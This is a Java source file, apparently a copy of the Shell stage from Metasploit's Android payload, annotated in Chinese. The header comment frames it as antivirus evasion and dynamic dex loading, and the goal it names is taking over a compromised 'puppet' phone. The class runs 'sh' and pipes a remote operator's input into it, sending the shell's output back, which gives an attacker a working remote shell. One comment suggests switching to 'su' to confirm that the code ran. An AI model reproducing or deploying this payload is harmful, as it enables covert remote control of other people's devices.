
package androidpayload.stage;

import java.io.DataInputStream;
import java.io.OutputStream;

import javapayload.stage.Stage;
import javapayload.stage.StreamForwarder;

/**
 * 源码级免杀_Dex动态加载技术_Metasploit安卓载荷傀儡机代码复现，Metasploit安卓载荷运行流程分析_复现meterpreter模块接管shell
 */
public class Shell {

    // This is for backwards compatiblity with older (pre #136) payloads
    public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        start(in, out, null);
    }

    public void start(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
        final Process proc = Runtime.getRuntime().exec("sh");
        //meterpreter向傀儡机传输的dex文件的指定类中，start方法内需要传入输入流和输出流,并进行一些处理以达到利用特定的代码控制傀儡机载荷做出相应行为的目的,，发送指定的类路径,再发送指定jar文件
        //exec("sh")要改为exec("su && mkdir shell")，这样就能通过判断shell文件夹是否被创建来判断代码是否被执行了
        new StreamForwarder(in, proc.getOutputStream(), out).start();
        new StreamForwarder(proc.getInputStream(), out, out).start();
        new StreamForwarder(proc.getErrorStream(), out, out).start();
        proc.waitFor();
        in.close();
        out.close();
    }
}
